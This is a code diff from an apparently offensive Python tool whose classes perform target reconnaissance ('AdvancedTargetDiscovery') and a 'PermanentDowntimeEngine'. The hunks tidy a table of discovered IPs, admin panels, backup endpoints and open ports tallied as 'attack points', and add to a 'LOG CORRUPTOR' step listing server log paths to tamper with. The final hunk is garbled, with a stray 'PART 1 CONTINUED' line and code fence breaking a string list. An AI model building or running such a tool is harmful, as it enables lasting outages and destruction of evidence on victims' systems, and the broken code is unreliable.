@@ -649,20 +649,20 @@ class AdvancedTargetDiscovery:
         
         # Add rows for each category
         categories = [
-            ("IP Addresses", self.infrastructure['ips'][:3]),
-            ("Subdomains", self.infrastructure['subdomains'][:3]),
-            ("Health Endpoints", self.infrastructure['health_endpoints'][:3]),
-            ("Admin Panels", self.infrastructure['admin_panels'][:3]),
-            ("Backup Endpoints", self.infrastructure['backup_endpoints'][:3]),
-            ("API Endpoints", self.infrastructure['api_endpoints'][:3]),
-            ("Open Ports", self.infrastructure['vulnerable_ports'][:3]),
-            ("DNS Servers", self.infrastructure['dns_servers'][:3]),
-            ("Mail Servers", self.infrastructure['mail_servers'][:3])
+            ("IP Addresses", self.infrastructure['ips'], 'ips'),
+            ("Subdomains", self.infrastructure['subdomains'], 'subdomains'),
+            ("Health Endpoints", self.infrastructure['health_endpoints'], 'health_endpoints'),
+            ("Admin Panels", self.infrastructure['admin_panels'], 'admin_panels'),
+            ("Backup Endpoints", self.infrastructure['backup_endpoints'], 'backup_endpoints'),
+            ("API Endpoints", self.infrastructure['api_endpoints'], 'api_endpoints'),
+            ("Open Ports", self.infrastructure['vulnerable_ports'], 'vulnerable_ports'),
+            ("DNS Servers", self.infrastructure['dns_servers'], 'dns_servers'),
+            ("Mail Servers", self.infrastructure['mail_servers'], 'mail_servers')
         ]
         
-        for category_name, examples in categories:
-            count = len(getattr(self, 'infrastructure')[category_name.lower().replace(' ', '_').split('_')[0] + 's'])
-            example_str = ", ".join(str(e) for e in examples) if examples else "None"
+        for category_name, examples, key in categories:
+            count = len(examples)
+            example_str = ", ".join(str(e) for e in examples[:3]) if examples else "None"
             if len(example_str) > 25:
                 example_str = example_str[:22] + "..."
             
@@ -672,7 +672,7 @@ class AdvancedTargetDiscovery:
         
         # Calculate attack surface
         total_attack_points = sum(
-            len(getattr(self, 'infrastructure')[key]) 
+            len(self.infrastructure[key]) 
             for key in self.infrastructure.keys()
         )
         
@@ -831,8 +831,12 @@ class PermanentDowntimeEngine:
             return
             
         console.print("[red]📝 ACTIVATING LOG CORRUPTOR[/]")
+        
         log_endpoints = [
             '/var/log', '/logs', '/log', '/tmp/logs',
+            '/application/logs', '/**PART 1 CONTINUED...**
+
+```python
             '/application/logs', '/app/logs', '/system/logs',
             '/error_log', '/access_log', '/debug.log',
             '/error.log', '/access.log', '/server.log'
